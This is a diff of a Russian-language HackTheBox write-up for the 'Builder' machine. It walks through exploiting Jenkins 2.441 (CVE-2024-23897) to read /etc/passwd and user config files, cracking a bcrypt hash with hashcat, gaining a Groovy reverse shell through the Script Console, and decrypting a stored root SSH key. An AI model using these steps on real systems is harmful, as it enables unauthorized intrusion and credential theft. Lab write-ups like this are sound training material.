@@ -1,10 +1,15 @@
 # Builder (2025)
 
+<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure></div>
 
+## Тэги:
 
-<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+* CVE-2024-23897
+* Jenkins Enumeration
 
+## Разведка
 
+При сканировании портов было обнаружено два открытых `tcp`-порта `22` и `8080`:
 
 ```shellscript
 $ nmap -sC -sV 10.129.230.220 -oN nmap.out
@@ -27,19 +32,17 @@ PORT     STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+На `8080` порте был `Jenkins` версии `2.441`:
 
+<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure></div>
 
-<figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
+## Получение первоначального доступа - jenkins (LFI,  Groovy Reverse Shell)
 
+На [exploit-db.com](https://www.exploit-db.com/) можно найти следующий `LFI`-эксплоит для данной версии `Jenkins`:
 
+{% embed url="https://www.exploit-db.com/exploits/51993" %}
 
-Jenkins 2.441
-
-
-
-[https://www.exploit-db.com/exploits/51993](https://www.exploit-db.com/exploits/51993)
-
-
+С помощью него был прочитан файл `/etc/passwd`:
 
 ```shellscript
 ┌──(trager㉿hackandgtfo)-[~/HackTheBox/Builder]
@@ -65,7 +68,7 @@ sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
 ```
 
-
+Далее можно было прочитать файл `users.xml`, который содержит информацию о пользователях:
 
 ```shellscript
 ┌──(trager㉿hackandgtfo)-[~/HackTheBox/Builder]
@@ -82,7 +85,7 @@ sync:x:4:65534:sync:/bin:/bin/sync
     </entry>
 ```
 
-
+И прочитать конкретный файл пользователя - `config.xml`, который содержит хеш пароля:
 
 ```shellscript
 ┌──(trager㉿hackandgtfo)-[~/HackTheBox/Builder]
@@ -150,7 +153,7 @@ sync:x:4:65534:sync:/bin:/bin/sync
       <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>
 ```
 
-
+Тип хеша можно определить исходя из подписи `jbcrypt` или утилиты `hashid`:
 
 ```shellscript
 ┌──(trager㉿hackandgtfo)-[~/HackTheBox/Builder]
@@ -161,125 +164,60 @@ Analyzing '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a'
 [+] bcrypt [JtR Format: bcrypt]
 ```
 
-
+Сбрутить хеш можно с помощью утилиты `hashcat`:
 
 ```shellscript
 ┌──(trager㉿hackandgtfo)-[~/HackTheBox/Builder]
 └─$ sudo hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt 
-[sudo] password for trager: 
-hashcat (v6.2.6) starting
-
-OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
-============================================================================================================================================
-* Device #1: cpu-haswell-AMD Ryzen 9 5950X 16-Core Processor, 2898/5861 MB (1024 MB allocatable), 8MCU
-
-Minimum password length supported by kernel: 0
-Maximum password length supported by kernel: 72
-
-Hashes: 1 digests; 1 unique digests, 1 unique salts
-Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
-Rules: 1
-
-Optimizers applied:
-* Zero-Byte
-* Single-Hash
-* Single-Salt
-
-Watchdog: Temperature abort trigger set to 90c
-
-Host memory required for this attack: 0 MB
-
-Dictionary cache hit:
-* Filename..: /usr/share/wordlists/rockyou.txt
-* Passwords.: 14344385
-* Bytes.....: 139921507
-* Keyspace..: 14344385
-
+<...вырезано...>
 $2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess
-                                                          
-Session..........: hashcat
-Status...........: Cracked
-Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
-Hash.Target......: $2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQ.../L4l1a
-Time.Started.....: Sun Nov 30 05:51:59 2025 (1 sec)
-Time.Estimated...: Sun Nov 30 05:52:00 2025 (0 secs)
-Kernel.Feature...: Pure Kernel
-Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
-Guess.Queue......: 1/1 (100.00%)
-Speed.#1.........:      112 H/s (2.46ms) @ Accel:8 Loops:8 Thr:1 Vec:1
-Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
-Progress.........: 64/14344385 (0.00%)
-Rejected.........: 0/64 (0.00%)
-Restore.Point....: 0/14344385 (0.00%)
-Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
-Candidate.Engine.: Device Generator
-Candidates.#1....: 123456 -> charlie
-Hardware.Mon.#1..: Util: 12%
-
-Started: Sun Nov 30 05:51:37 2025
-Stopped: Sun Nov 30 05:52:01 2025
+<...вырезано...>
 ```
 
+После этого в Jenkins можно авторизоваться с УД `jennifer`/`princess`:
 
+<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure></div>
 
-jennifer:princess
+<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure></div>
 
+Чтобы получить шелл, нужно перейти в `Manage Jenkins` -> `Script Console` (`/manage/script`):
 
+<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure></div>
 
-<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+С помощью данной страницы можно выполнять `Groovy`-код. У [Reverse Shell Generator](https://www.revshells.com/) и для этого есть отдельная вкладка:
 
+<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure></div>
 
+Таким образом был получен реверс шелл:
 
-<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure></div>
 
-
-
-Для получения реверс шелла нужно перейти в Manage Jenkins -> Script Console [http://10.129.230.220:8080/manage/script](http://10.129.230.220:8080/manage/script):
-
-
-
-<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
-
-
-
-<figure><img src="../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
-
-
-
-<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
-
-
+И стабилизирована оболочка с помощью `/usr/bin/script`, поскольку интерпретатор `python` отсутствовал:
 
 ```shellscript
 /usr/bin/script -qc /bin/bash /dev/null
 export TERM=xterm
 ```
 
+<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure></div>
 
+## Повышение привилегий - root (Jenkins id\_rsa)
 
-<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+В файле `/var/jenkinks_home/credentials.xml` был обнаружен зашифрованный `id_rsa` ключ для суперпользователя:
 
+<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure></div>
 
-
-<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
-
-
-
-Для расшифровки можно использовать следующий скрипт на странице [http://10.129.230.220:8080/manage/script](http://10.129.230.220:8080/manage/script):
+Для расшифровки была использована всё та же страница, что и для выполнения полезной нагрузки с реверс шеллом (`/manage/script`):
 
 ```groovy
 println(hudson.util.Secret.fromString("{AQAAA...вырезано>KSM=}").getPlainText())
 ```
 
+<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure></div>
 
+Далее ключ был использован для подключения к хосту от имени пользователя `root`:
 
-<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure></div>
 
-
-
-<figure><img src="../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
-
-
-
-<figure><img src="../../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
+<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure></div>
 
